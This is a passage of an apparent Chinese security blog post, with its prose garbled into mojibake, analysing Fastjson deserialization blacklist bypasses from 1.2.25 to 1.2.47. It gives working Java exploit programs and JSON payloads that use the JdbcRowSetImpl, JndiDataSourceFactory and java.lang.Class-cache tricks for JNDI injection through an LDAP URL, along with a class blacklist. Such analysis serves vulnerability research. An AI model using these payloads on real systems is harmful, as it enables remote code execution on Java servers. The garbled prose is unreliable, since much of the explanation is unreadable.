class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure><p>Ë∞ÉËØï‰∏≠ÂèØ‰ª•ÁúãÂà∞Âõ†‰∏∫autoTypeSupport‰∏∫FalseÊâÄ‰ª•ËøõË°åÈªëÂêçÂçïÊ†°È™åÁÑ∂ÂêéÊäõÂºÇÂ∏∏ÈÄÄÂá∫ÔºåÈÇ£‰πàÁúãÁúãautoTypeSupportÊòØ‰ªÄ‰πà</p><h3 id="autoTypeSupport"><a href="#autoTypeSupport" class="headerlink" title="autoTypeSupport"></a>autoTypeSupport</h3><p>autoTypeSupportÊòØ<code>checkAutoType()</code>ÂáΩÊï∞Âá∫Áé∞ÂêéParserConfig.java‰∏≠Êñ∞Â¢ûÁöÑ‰∏Ä‰∏™ÈÖçÁΩÆÈÄâÈ°πÔºåÂú®<code>checkAutoType()</code>ÂáΩÊï∞ÁöÑÊüê‰∫õ‰ª£Á†ÅÈÄªËæëËµ∑Âà∞ÂºÄÂÖ≥ÁöÑ‰ΩúÁî®„ÄÇ</p><p>ÈªòËÆ§ÊÉÖÂÜµ‰∏ãautoTypeSupport‰∏∫FalseÔºåÂ∞ÜÂÖ∂ËÆæÁΩÆ‰∏∫TrueÊúâ‰∏§ÁßçÊñπÊ≥ïÔºö</p><ul><li>JVMÂêØÂä®ÂèÇÊï∞Ôºö<code>-Dfastjson.parser.autoTypeSupport=true</code></li><li>‰ª£Á†Å‰∏≠ËÆæÁΩÆÔºö<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>ÔºåÂ¶ÇÊûúÊúâ‰ΩøÁî®ÈùûÂÖ®Â±ÄParserConfigÂàôÁî®Âè¶Â§ñË∞ÉÁî®<code>setAutoTypeSupport(true);</code></li></ul><p>AutoTypeÁôΩÂêçÂçïËÆæÁΩÆÊñπÊ≥ïÔºö</p><ol><li>JVMÂêØÂä®ÂèÇÊï∞Ôºö<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li><li>‰ª£Á†Å‰∏≠ËÆæÁΩÆÔºö<code>ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);</code></li><li>ÈÄöËøáfastjson.propertiesÊñá‰ª∂ÈÖçÁΩÆ„ÄÇÂú®1.2.25&#x2F;1.2.26ÁâàÊú¨ÊîØÊåÅÈÄöËøáÁ±ªË∑ØÂæÑÁöÑfastjson.propertiesÊñá‰ª∂Êù•ÈÖçÁΩÆÔºåÈÖçÁΩÆÊñπÂºèÂ¶Ç‰∏ãÔºö<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li></ol><h2 id="1-2-25-1-2-41ÁªïËøá"><a href="#1-2-25-1-2-41ÁªïËøá" class="headerlink" title="1.2.25~1.2.41ÁªïËøá"></a>1.2.25~1.2.41ÁªïËøá</h2><p>ÂÖàÁúãexpÔºåserverÁ´ØÂíå‰πãÂâç‰∏ÄÊ†∑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280000869.png" alt="image-20230828000012407"><br>Âíå‰πãÂâçÁöÑÂå∫Âà´Â∞±ÊòØÂºÄÂêØ‰∫ÜautoTypeSupportÁÑ∂ÂêéÂú®<code>com.sun.rowset.JdbcRowSetImpl</code>ÂºÄÂ§¥Âä†‰∫Ü‰∏™<code>L</code>ÁªìÂ∞æÂä†‰∏™<code>;</code>ËøôÊ†∑Â∞±ÁªïËøá‰∫Ü<br>‰∏ãÈù¢Ë∞ÉËØï‰∏Ä‰∏ãÔºåËøôÈáåÁöÑ<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>Á±ªÊòØ‰∏çÂ≠òÂú®ÁöÑ<br>ËøôÈáåÂèØ‰ª•ÁúãÂà∞autoTypeSupportÂ∑≤ÁªèÂèò‰∏∫true‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280000553.png" alt="image-20230828000033226"><br>ÁÑ∂ÂêéÊù•Âà∞‰∫ÜÈªëÂêçÂçïÊ†°È™å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280000542.png" alt="image-20230828000052244"><br>ËøôÈáå‰ºö‰∏Ä‰∏™‰∏™Ê£ÄÈ™åÊúÄÁªàÊ£ÄÈ™å‰∏çÂà∞Ë∑≥Âá∫ÔºåÂèØ‰ª•Ëá™Â∑±ÊâãÂä®Ë∑≥Âá∫‰∏çÁÑ∂‰ºöÂà§Êñ≠Âæà‰πÖÔºåÁÑ∂ÂêéÁªßÁª≠ÂæÄ‰∏ãÊù•Âà∞‰∏ãÈù¢ËøôÈáå<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280001155.png" alt="image-20230828000106862"><br>ËøõÂÖ•Ëøô‰∏™loadClassÔºåÂú®‰∏ãÈù¢ËøôÈáå‰ºöÂØπÁ±ªËøõË°åÂà§Êñ≠Â¶ÇÊûúÁ±ªÁöÑÈ¶ñÂ∞æÊòØ<code>L</code>Âíå<code>;</code>ÂêéÂéªÊéâÈ¶ñÂ∞æÂèò‰∏∫<code>com.sun.rowset.JdbcRowSetImpl</code>ÂÇ®Â≠òÂú®newClassName<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280001776.png" alt="image-20230828000134596"><br>ÊúÄÁªàÂú®‰∏ãÈù¢‰∏ãÈù¢ËøôÈáåËøîÂõûclazzÂç≥<code>com.sun.rowset.JdbcRowSetImpl</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280001183.png" alt="image-20230828000147996"><br>ÂêéÈù¢Â∞±Âíå‰πãÂâçÁöÑÂ∑Æ‰∏çÂ§ö‰∫Ü</p><h2 id="1-2-25-1-2-42-ÁªïËøá"><a href="#1-2-25-1-2-42-ÁªïËøá" class="headerlink" title="1.2.25~1.2.42 ÁªïËøá"></a>1.2.25~1.2.42 ÁªïËøá</h2><p>Âú®1.2.42ÁâàÊú¨ÂèëÁé∞‰∏äÈù¢ÁöÑËøô‰∏™expÊâì‰∏çÈÄö‰∫ÜÔºåÊñ∞ÁöÑexpÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ë∞ÉËØïÁúã‰∏Ä‰∏ãÔºåÂú®‰∏ãÈù¢ËøôÈáåË∞ÉÁî®‰∫Ü<code>checkAutoType</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280002478.png" alt="image-20230828000205928"><br>Ë∑üËøõÂéªÁúã‰∏Ä‰∏ãÔºåÂú®‰∏ãÈù¢ËøôÈáåÊàë‰ª¨ÂèëÁé∞Á±ªÂêçÂèò‰∏∫‰∫Ü<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>Â∞ë‰∫Ü‰∏™<code>L</code>Âíå<code>;</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280002312.png" alt="image-20230828000223809"><br>ËøîÂõûÁúã‰∏ãÂ§ÑÁêÜÈÄªËæëÔºåÂèëÁé∞ËøôÈáåÁöÑÂ§ÑÁêÜÈÄªËæë‰∏çÂÜçÊòØÊòéÊñáÔºåÈááÁî®‰∫ÜÂä†ÂØÜÊ∑∑Ê∑Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280002998.png" alt="image-20230828000242717"><br>Âπ∂‰∏îÈªëÂêçÂçï‰πüÂèò‰∏∫‰∫ÜÂ¶Ç‰∏ãÂΩ¢Âºè<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280002931.png" alt="image-20230828000257574"><br>FastjsonÊääÂéüÊú¨ÊòéÊñáÂΩ¢ÂºèÁöÑÈªëÂêçÂçïÊîπÊàê‰∫ÜÂìàÂ∏åËøáÁöÑÈªëÂêçÂçïÔºå‰ΩÜÊòØÊúâ‰∫∫Â∑≤Âú®Github‰∏äË∑ëÂá∫‰∫ÜÂ§ßÈÉ®ÂàÜÈªëÂêçÂçïÂåÖÁ±ªÔºö<br><a href="https://github.com/LeadroyaL/fastjson-blacklist">LeadroyaL&#x2F;fastjson-blacklist (github.com)</a><br>ÂÆûÈôÖ‰∏äÂ∞±ÊòØÂ¶ÇÊûúÁ±ªÂêçÈ¶ñÂ∞æÂ≠òÂú®<code>L</code>Âíå<code>;</code>Â∞±‰ºöËøõË°åÂéªÈô§<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280003632.png" alt="image-20230828000322073"><br>ÂèØ‰ª•ÁúãÂà∞Ê≠§Êó∂<code>className</code>Âèò‰∏∫‰∫Ü<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>ÊúÄÁªà‰ºöËµ∞Âà∞‰∏ãÈù¢ËøôÈáå<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280003168.png" alt="image-20230828000344652"><br>ÂêéÈù¢ÁöÑÂ§ÑÁêÜÊ≠•È™§Â∞±Âíå1.2.41‰∏ÄÊ†∑‰∫ÜÔºåËøôÈáå‰øÆÂ§çÁöÑÊÑüËßâÂíåÊàëÂπ≥Êó∂ÂÅö‰∫ã‰∏ÄÊ†∑ÔºåËÄÉËôë‰∏çÂÖ®Âè™ÂéªÈô§‰∫Ü‰∏ÄÊ¨°<code>L</code>Âíå<code>;</code></p><h2 id="1-2-25-1-2-43-ÁªïËøá"><a href="#1-2-25-1-2-43-ÁªïËøá" class="headerlink" title="1.2.25~1.2.43 ÁªïËøá"></a>1.2.25~1.2.43 ÁªïËøá</h2><p>ËøôÈáå‰∏äÈù¢ÁöÑexpÂ∑≤ÁªèÊâì‰∏çÈÄö‰∫ÜÔºå‰∏çËøáÂÖàÊãøÈÇ£‰∏™Ë∞É‰∏Ä‰∏ãÁúãÁúãÂú®43ÁâàÊú¨ÊòØÊÄé‰πàÂ§ÑÁêÜÁöÑ<br>È¶ñÂÖàÊòØ‰∏ãÈù¢ËøôÈáåÁöÑÂà§Êñ≠Ôºå‰∏äÈù¢ÂøòËÆ∞ËØ¥‰∫ÜÔºåÁ±ªÂêçÈïøÂ∫¶‰∏çËÉΩË∂ÖËøá128‰∏î‰∏çËÉΩÂ∞è‰∫é3Âê¶ÂàôÊäõÂá∫ÂºÇÂ∏∏<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280004334.png" alt="image-20230828000404217"><br>ÂèØ‰ª•ÁúãÂà∞Âú®‰∏ãÈù¢ËøôÈáåÁõ¥Êé•ÊäõÂá∫‰∫ÜÂºÇÂ∏∏<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280004636.png" alt="image-20230828000423114"><br>Âú®Á¨¨‰∫å‰∏™if‰∏≠ÂØπ‰ª•LLÂºÄÂ§¥ÁöÑÁ±ªÁõ¥Êé•ÊäõÂá∫ÂºÇÂ∏∏<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280004731.png" alt="image-20230828000440591"><br>Âú®<code>TypeUtils.loadClass</code>‰∏≠ËøòÊúâ‰∏™ÂØπ‰ª•<code>[</code>ÂºÄÂ§¥ÁöÑÁ±ªËøõË°åÂä†ËΩΩ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280004881.png" alt="image-20230828000452772"><br>ÈÇ£‰πàÂ∞ÜexpÊîπ‰∏ã‰ª•<code>[</code>ÂºÄÂ§¥Ëá™ÁÑ∂Â∞±ËÉΩÁªïËøá‰∏äÈù¢ÁöÑifÊ£ÄÊµãÔºåÁÑ∂ÂêéÁªßÁª≠Ë∞ÉËØïÊù•Âà∞‰∏ãÈù¢ËøôÈáå<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280005032.png" alt="image-20230828000506507"><br>ÁªèËøáË∞ÉËØïÂèëÁé∞Âè™ÊòØÂä†‰∏™<code>[</code>ËôΩÁÑ∂ËÉΩËøáÊ£ÄÊµã‰ΩÜÊòØÊó†Ê≥ïÂºπÂá∫ËÆ°ÁÆóÂô®‰∏î‰ºöÊä•Â¶Ç‰∏ãÁöÑÈîôËØØ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280005738.png" alt="image-20230828000523575"><br>‰∏äÈù¢ËøîÂõûÁöÑÁ±ªÂêçÊòØ<code>[com.sun.rowset.JdbcRowSetImpl</code>ÂêéÈù¢Ë¶ÅÂÆåÊàêÁöÑÊòØÂèçÂ∫èÂàóÂåñÔºåÈÇ£‰πàËøô‰∏™ÈóÆÈ¢òÂ∫îËØ•Â∞±ÊòØÂá∫Âú®ÂèçÂ∫èÂàóÂåñÁöÑÊ≠•È™§ÔºåÁªßÁª≠Ë∞ÉËØïÔºåÂú®‰∏ãÈù¢ËøôÈáåÂèØ‰ª•ÁúãÂà∞ËøîÂõûÁöÑclazzÊòØ<code>[Lcom.sun.rowset.JdbcRowSetImpl;</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280005550.png" alt="image-20230828000538012"><br>ÊâæÂà∞‰∫ÜÊäõÂá∫ÂºÇÂ∏∏ÁöÑ‰ΩçÁΩÆÂú®<code>parseArray</code>ÊñπÊ≥ï‰∏≠<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280005509.png" alt="image-20230828000557991"><br>ÈÇ£‰πàËß£ÂÜ≥Ëøô‰∏™Êä•ÈîôÈóÆÈ¢òÊòØ‰∏çÊòØÂ∞±Ë°å‰∫ÜÂë¢ÔºüÂÖàËØïËØïÔºåËß£ÂÜ≥Êä•ÈîôÊ†πÊçÆ‰∏äÈù¢ÁöÑÊä•ÈîôÊîπÔºå‰∏äÈù¢ÁöÑÊä•ÈîôÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exepct <span class="string">&#x27;[&#x27;</span>, but ,, pos <span class="number">42</span>, json : &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1099/ExportObject&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="string">&quot;true&quot;</span> &#125;</span><br></pre></td></tr></table></figure><p>Âú®42ÁöÑ‰ΩçÁΩÆÊúüÂæÖÊòØ<code>[</code>‰ΩÜÊòØ‰∏∫<code>,</code>ÈÇ£‰πàÊääexpÊîπ‰∏∫Â¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span></span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ÂèàÊä•Èîô‰∫ÜÔºåÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syntax error, expect &#123;, actual string, pos <span class="number">43</span>, fastjson-version <span class="number">1.2</span><span class="number">.43</span></span><br></pre></td></tr></table></figure><p>Âú®43ÁöÑ‰ΩçÁΩÆÊúüÂæÖ‰∏∫<code>&#123;</code>ÈÇ£‰πàÂä†‰∏™ÁúãÁúã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>ÂºπÂá∫ËÆ°ÁÆóÂô®ÊàêÂäü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280006164.png" alt="image-20230828000622738"><br>expÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-25-1-2-45ÁªïËøá"><a href="#1-2-25-1-2-45ÁªïËøá" class="headerlink" title="1.2.25~1.2.45ÁªïËøá"></a>1.2.25~1.2.45ÁªïËøá</h2><p>Âú®Ëøô‰∏™ÁâàÊú¨‰∏≠ÔºåÂà©Áî®ÁöÑÊòØ<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>ÂØπÈªëÂêçÂçïÁªïËøáÔºå‰ΩÜÊòØÊúâ‰∏ÄÂÆöÁöÑÂâçÊèêÊù°‰ª∂<br><strong>ÂâçÊèêÊù°‰ª∂ÔºöÈúÄË¶ÅÁõÆÊ†áÊúçÂä°Á´ØÂ≠òÂú®mybatisÁöÑjarÂåÖÔºå‰∏îÁâàÊú¨ÈúÄ‰∏∫3.x.xÁ≥ªÂàó&lt;3.5.0ÁöÑÁâàÊú¨„ÄÇ</strong><br>ËøôÈáåldapÂíårmiÈÉΩËÉΩÊâìÔºåÊç¢‰∏™ÂçèËÆÆÂ∞±Ë°åÔºåÊú¨Âú∞ÁöÑËØùserverÂΩìÁÑ∂Â∞±Ë¶ÅËµ∑rmiÁöÑ‰∫Ü<br>ÂØºÂÖ•mybatisÁöÑ‰æùËµñ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">3.4</span><span class="number">.4</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>expÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass45</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://127.0.0.1:1099/remoteObj\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280006203.png" alt="image-20230828000637764"><br>‰∏ãÈù¢Ë∞ÉËØïÁúã‰∏Ä‰∏ãÔºåÂ¶Ç‰∏ãÂèØ‰ª•ÁúãÂà∞Á±ªÂêçÂ¶ÇÊûú‰ª•<code>[</code>ÂºÄÂ§¥Áõ¥Êé•ÊäõÂá∫ÂºÇÂ∏∏ÁªìÊùü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280006859.png" alt="image-20230828000653345"><br>‰∏ãÈù¢ËøôÈáåÁî±‰∫é<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>‰∏çÂú®ÈªëÂêçÂçïËøõËÄåÁªïËøáÊ£ÄÊµã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280007332.png" alt="image-20230828000710816"><br>ÁÑ∂ÂêéÂ∞±ÁÆóÂØπËøô‰∏™Á±ªÁöÑÂà©Áî®ÂàÜÊûêÔºåÈÄöËøáexpÂèØ‰ª•ÁúãÂà∞ÊòØÂØπpropertiesÂ±ûÊÄßÁöÑÂà©Áî®ÔºåÁî±‰∫éÂú®<code>deserialze</code>ÊñπÊ≥ï‰∏ã‰∏çÂ§™Â•ΩË∞ÉÔºàÊäÄÊúØÂ§™ËèúÔºâÁõ¥Êé•Êù•Âà∞<code>JndiDataSourceFactory</code>Á±ª‰∏ãÔºåÁúãÂà∞Â≠òÂú®setterÊñπÊ≥ï‰∏∫<code>setProperties()</code>fastjsonËÉΩÂ§üËá™Âä®Ë∞ÉÁî®ÔºåÁõ¥Êé•Âú®ËØ•setterÊñπÊ≥ïÊâìÊñ≠ÁÇπÔºåÁÑ∂ÂêéÂ∞±ÊòØÂ≠òÂú®JNDIÊ≥®ÂÖ•‰∫ÜÔºåÂç≥<code>InitialContext.lookup()</code>ÔºåÂÖ∂‰∏≠ÂèÇÊï∞Áî±Êàë‰ª¨ËæìÂÖ•ÁöÑpropertiesÂ±ûÊÄß‰∏≠ÁöÑdata_sourceÂÄºËé∑ÂèñÁöÑÔºö<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280007822.png" alt="image-20230828000726311"></p><h2 id="1-2-25-1-2-47ÁªïËøá"><a href="#1-2-25-1-2-47ÁªïËøá" class="headerlink" title="1.2.25~1.2.47ÁªïËøá"></a>1.2.25~1.2.47ÁªïËøá</h2><p>Âú®1.2.47ÁâàÊú¨‰∏≠‰∏äÈù¢ÁöÑexpÂèà‰∏çË°å‰∫ÜÔºåÂéüÂõ†ÊòØËøô‰∏™Á±ªÂà∞ÈªëÂêçÂçïÂéª‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280007057.png" alt="image-20230828000743553"><br>ËøôÊ¨°Âà©Áî®ÁöÑÊòØ‰πãÂâçÁöÑpayloadÂú®ÈªòËÆ§‰∏çÂºÄÂêØAutoTypeSupportÁöÑÊÉÖÂÜµ‰∏ãÈÄöËøáÁºìÂ≠òÂä†ËΩΩ<code>JdbcRowSetImpl</code>Á±ªÔºåexpÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass47</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/remoteObj\&quot;,\&quot;AutoCommit\&quot;:\&quot;false\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280008657.png" 